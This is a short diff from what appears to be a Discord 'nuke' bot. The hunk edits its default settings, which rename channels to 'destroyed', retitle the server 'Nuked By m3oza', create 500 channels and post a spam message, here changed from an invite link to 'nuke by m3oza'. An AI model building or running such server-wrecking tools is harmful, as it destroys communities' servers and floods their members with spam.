@@ -23,7 +23,7 @@ function getSettings(key) {
         nukeSettings.set(key, {
             channel_name: 'destroyed',
             server_name: 'Nuked By m3oza',
-            spam_message: 'https://discord.gg/JF2EvyfMPQ',
+            spam_message: 'nuke by m3oza',
             channel_count: 500,
             ping_count: 1
         });
